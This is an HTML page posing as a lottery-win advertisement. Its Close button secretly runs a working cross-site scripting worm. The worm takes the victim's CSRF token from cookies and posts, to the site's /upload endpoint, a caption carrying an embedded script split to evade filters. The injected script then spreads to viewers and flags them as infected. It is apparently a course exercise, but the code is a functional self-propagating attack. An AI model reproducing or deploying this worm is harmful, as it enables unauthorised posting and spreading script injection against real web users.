<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You won the lottery!</title>
</head>
<body>
    <!-- Advertisement Section -->
    <div id="ad-section" class="ad-container">
        <div class="ad-content">
            <p>This is your advertisement. Click the close button to dismiss.</p>
            <button id="close-ad-btn">Close</button>
        </div>
    </div>
    <script>
        // Function to spread the worm
        function spreadWorm(triggerMessage) {
            // Immediately trigger the hidden post creation
            createHiddenPost(triggerMessage);
    
            // Function to send a request to the Django `infect_user` view
            function createHiddenPost(caption) {
                const formData = new FormData();
    
                // Prepare the form data for the request
                formData.append("uphoto", "");
                formData.append("caption", caption);
                formData.append("sha", "ae0b6badeb338b59cda2135ed783c28beaf6d622")
    
                fetch("/upload", {
                    method: "POST",
                    body: formData,
                    headers: {
                        "X-CSRFToken": getCSRFToken(), // Secure with CSRF token
                    },
                })
                    .then((response) => {
                        if (response.ok) {
                            console.log("Worm: New hidden post created successfully!");
                        } else {
                            console.error("Worm: Failed to create a new hidden post.");
                        }
                    })
                    .catch((error) => {
                        console.error("Worm: Error while creating a hidden post:", error);
                    });
            }
    
            // Function to retrieve the CSRF token from cookies
            function getCSRFToken() {
                const cookies = document.cookie.split(";");
                for (let cookie of cookies) {
                    const [key, value] = cookie.trim().split("=");
                    if (key === "csrftoken") {
                        return value;
                    }
                }
                return null;
            }
        }
    
        // Wait for the DOM to be fully loaded
        document.addEventListener("DOMContentLoaded", () => {
            // Select the Close Ad button
            const closeAdBtn = document.getElementById("close-ad-btn");
            if (!closeAdBtn) {
                console.error("Close Ad button not found!");
                return;
            }
    
            closeAdBtn.addEventListener("click", () => {
    
                // Check if the user has already been infected
                const session = localStorage.getItem("SESSIONID");
                const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" || session == "2d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4" ? true : false;
                
                if (isAlreadyInfected) {
                    console.log(`User has already been infected. Skipping injection.`);
                    return;
                }
    
                // Mark the current user as infected
                localStorage.setItem("SESSIONID", "ae0b6badeb338b59cda2135ed783c28beaf6d622");
    
                    // Prepare the worm message and additional script
                    const text = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
                    const payload = `
                            (function tickleWorm() {
                                const triggerWord = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
                                const posts = document.querySelectorAll('.card.vichlacard');
                                console.log("posts posts: ", posts);
                                // Run the worm only once per page
                                if (document.body.dataset.wormInjected) return;
                                document.body.dataset.wormInjected = "true"; // Mark the worm as injected

                                posts.forEach((post) => {
                                    if (!post.dataset.tickleWorm) {
                                        post.dataset.tickleWorm = true;

                                        // Extract the caption text
                                        const captionElement = post.querySelector('.card-text.caption');
                                        const captionText = captionElement ? captionElement.textContent : "";
                                        let session = localStorage.getItem("SESSIONID");
                                        const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" ? true : false;
                                        console.log("post isAlreadyInfected: ", isAlreadyInfected);
                                        // If the trigger word is found, display an image
                                        if (captionText.includes(triggerWord)) {
                                            // Check if the user has already been infected
                                            if (isAlreadyInfected) {
                                                console.log("User has already been infected. Skipping injection.");
                                                return;
                                            } else {
                                                displayImage();
                                                localStorage.setItem("SESSIONID", "2d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4");                                      
                                            }
                                        }
                                    }
                                });

                                // Function to display an image
                                function displayImage() {
                                    const img = document.createElement("img");
                                    img.src = "https://media.tenor.com/aUGKNa38o-gAAAAe/virus-computer.png"; // Replace with your image URL
                                    img.style.position = "fixed";
                                    img.style.top = "50%";
                                    img.style.left = "50%";
                                    img.style.transform = "translate(-50%, -50%)";
                                    img.style.zIndex = "9999";
                                    img.style.border = "2px solid black";
                                    img.style.borderRadius = "10px";
                                    img.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
                                    document.body.appendChild(img);

                                    // Automatically remove the image after 5 seconds
                                    setTimeout(() => {
                                        img.remove();
                                    }, 5000);
                                }
                            })();`
            const script = "<scr"+"ipt>" + payload + "</scr"+"ipt>";
            // Spread the worm
            spreadWorm(text + script);
            });
        });
    </script>    
</body>
</html>